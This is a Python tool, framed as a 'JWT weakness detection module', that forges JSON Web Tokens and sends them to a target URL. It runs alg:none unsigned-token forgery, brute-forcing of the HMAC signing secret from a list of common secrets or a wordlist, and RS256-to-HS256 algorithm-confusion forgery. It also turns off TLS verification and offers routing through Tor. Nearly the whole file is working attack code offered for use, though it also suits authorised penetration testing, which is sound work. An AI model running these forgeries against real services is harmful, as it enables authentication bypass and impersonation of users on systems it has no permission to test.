#!/usr/bin/env python3
import requests
import argparse
import base64
import json
import hmac
import hashlib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

COMMON_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "jwt",
    "token",
    "supersecret",
    "changeme",
    "qwerty",
]

# ------------------------------------------------
# JWT Utilities
# ------------------------------------------------

def base64url_decode(data):
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def decode_jwt(token):
    """Decode a JWT without verification and return header, payload."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            print("[!] Invalid JWT format")
            return None, None

        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))
        return header, payload
    except Exception as e:
        print(f"[!] Failed to decode JWT: {e}")
        return None, None

def print_jwt_info(header, payload):
    print("\n[*] JWT Header:")
    print(json.dumps(header, indent=2))
    print("\n[*] JWT Payload:")
    print(json.dumps(payload, indent=2))

# ------------------------------------------------
# Attack 1: alg:none
# ------------------------------------------------

def test_alg_none(token, url, param, proxies=None):
    """
    Tests if the server accepts a JWT with algorithm set to 'none',
    which means no signature is required.
    """
    print("\n[*] Testing alg:none attack...")

    parts = token.split(".")
    header = json.loads(base64url_decode(parts[0]))
    payload = json.loads(base64url_decode(parts[1]))

    # Modify header to use alg: none
    for alg_value in ["none", "None", "NONE"]:
        header["alg"] = alg_value
        new_header = base64url_encode(json.dumps(header, separators=(",", ":")))
        new_payload = base64url_encode(json.dumps(payload, separators=(",", ":")))

        # No signature
        forged_token = f"{new_header}.{new_payload}."

        headers = {param: f"Bearer {forged_token}"}

        try:
            r = requests.get(url, headers=headers, verify=False, proxies=proxies, timeout=10)
            print(f"    alg={alg_value} → Status: {r.status_code}")

            if r.status_code == 200:
                print(f"[+] alg:none CONFIRMED with alg={alg_value}!")
                print(f"    Forged token: {forged_token}")
                print(f"    Response preview: {r.text[:200]}")
                return {"attack": "alg_none", "alg_value": alg_value, "token": forged_token}

        except requests.exceptions.RequestException as e:
            print(f"[!] Request error: {e}")

    print("[-] alg:none attack not successful")
    return None

# ------------------------------------------------
# Attack 2: Weak secret brute force (HS256)
# ------------------------------------------------

def test_weak_secret(token, proxies=None, wordlist=None):
    """
    Attempts to brute force the HMAC secret used to sign the JWT.
    """
    print("\n[*] Testing for weak HS256 secret...")

    parts = token.split(".")
    if len(parts) != 3:
        print("[!] Invalid JWT")
        return None

    header = json.loads(base64url_decode(parts[0]))
    if header.get("alg") not in ("HS256", "HS384", "HS512"):
        print(f"[!] Token uses {header.get('alg')} — weak secret test only applies to HMAC algorithms")
        return None

    alg = header.get("alg")
    hash_func = hashlib.sha256 if alg == "HS256" else hashlib.sha512

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    original_sig = base64url_decode(parts[2])

    secrets_to_try = wordlist if wordlist else COMMON_SECRETS

    print(f"[*] Trying {len(secrets_to_try)} secrets...")

    for secret in secrets_to_try:
        sig = hmac.new(secret.encode(), signing_input, hash_func).digest()
        if hmac.compare_digest(sig, original_sig):
            print(f"[+] Weak secret FOUND: '{secret}'")
            return {"attack": "weak_secret", "secret": secret}

    print("[-] No weak secret found from wordlist")
    return None

# ------------------------------------------------
# Attack 3: Algorithm confusion (RS256 -> HS256)
# ------------------------------------------------

def test_algorithm_confusion(token, public_key, url, param, proxies=None):
    """
    Tests algorithm confusion — signing an RS256 token with HS256
    using the public key as the HMAC secret.
    """
    print("\n[*] Testing algorithm confusion (RS256 -> HS256)...")

    parts = token.split(".")
    header = json.loads(base64url_decode(parts[0]))
    payload = json.loads(base64url_decode(parts[1]))

    header["alg"] = "HS256"
    new_header = base64url_encode(json.dumps(header, separators=(",", ":")))
    new_payload = base64url_encode(json.dumps(payload, separators=(",", ":")))

    signing_input = f"{new_header}.{new_payload}".encode()

    sig = hmac.new(public_key.encode(), signing_input, hashlib.sha256).digest()
    new_sig = base64url_encode(sig)

    forged_token = f"{new_header}.{new_payload}.{new_sig}"
    headers = {param: f"Bearer {forged_token}"}

    try:
        r = requests.get(url, headers=headers, verify=False, proxies=proxies, timeout=10)
        print(f"    Status: {r.status_code}")

        if r.status_code == 200:
            print("[+] Algorithm confusion CONFIRMED!")
            print(f"    Forged token: {forged_token}")
            print(f"    Response preview: {r.text[:200]}")
            return {"attack": "algorithm_confusion", "token": forged_token}

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")

    print("[-] Algorithm confusion not successful")
    return None

# ------------------------------------------------
# Main
# ------------------------------------------------

def save_results(results, outfile):
    with open(outfile, "w") as f:
        for result in results:
            f.write(json.dumps(result, indent=2) + "\n\n")
    print(f"[+] Results saved to {outfile}")

def main():
    parser = argparse.ArgumentParser(description="JWT Weakness Detection Module")
    parser.add_argument("token", help="JWT token to test")
    parser.add_argument("--url", help="Target URL to test forged tokens against")
    parser.add_argument("--header", default="Authorization", help="Header name to send token in (default: Authorization)")
    parser.add_argument("--alg-none", action="store_true", help="Test alg:none attack")
    parser.add_argument("--weak-secret", action="store_true", help="Brute force weak HMAC secret")
    parser.add_argument("--alg-confusion", action="store_true", help="Test algorithm confusion (RS256 -> HS256)")
    parser.add_argument("--public-key", help="Public key for algorithm confusion attack")
    parser.add_argument("--wordlist", help="Path to custom wordlist for weak secret brute force")
    parser.add_argument("--all", action="store_true", dest="run_all", help="Run all applicable tests")
    parser.add_argument("--tor", action="store_true", help="Route traffic through Tor")
    parser.add_argument("--outfile", default=None, help="Save results to file")

    args = parser.parse_args()

    proxies = None
    if args.tor:
        print("[*] Routing traffic through Tor...")
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

    # Decode and display JWT info
    header, payload = decode_jwt(args.token)
    if not header:
        return
    print_jwt_info(header, payload)

    # Load custom wordlist if provided
    wordlist = None
    if args.wordlist:
        try:
            with open(args.wordlist, "r") as f:
                wordlist = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(wordlist)} secrets from wordlist")
        except Exception as e:
            print(f"[!] Could not load wordlist: {e}")

    results = []

    if args.run_all or args.alg_none:
        if args.url:
            result = test_alg_none(args.token, args.url, args.header, proxies)
            if result:
                results.append(result)
        else:
            print("[!] --url required for alg:none test")

    if args.run_all or args.weak_secret:
        result = test_weak_secret(args.token, proxies, wordlist)
        if result:
            results.append(result)

    if args.run_all or args.alg_confusion:
        if args.url and args.public_key:
            result = test_algorithm_confusion(args.token, args.public_key, args.url, args.header, proxies)
            if result:
                results.append(result)
        else:
            print("[!] --url and --public-key required for algorithm confusion test")

    if results:
        print(f"\n[+] {len(results)} vulnerability/vulnerabilities confirmed")
    else:
        print("\n[-] No JWT vulnerabilities detected")

    if results and args.outfile:
        save_results(results, args.outfile)

if __name__ == "__main__":
    main()
